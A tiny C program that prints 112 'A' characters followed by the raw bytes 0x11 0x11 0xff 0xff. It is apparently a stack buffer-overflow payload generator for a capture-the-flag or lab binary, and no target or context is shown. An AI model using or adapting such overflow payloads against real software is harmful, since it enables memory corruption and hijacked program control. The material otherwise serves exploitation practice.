#include <stdio.h>

int main() {
        for (int i = 0; i < 112; ++i) {
                printf("A");
        }
        printf("\x11\x11\xff\xff");
        return 0;
}
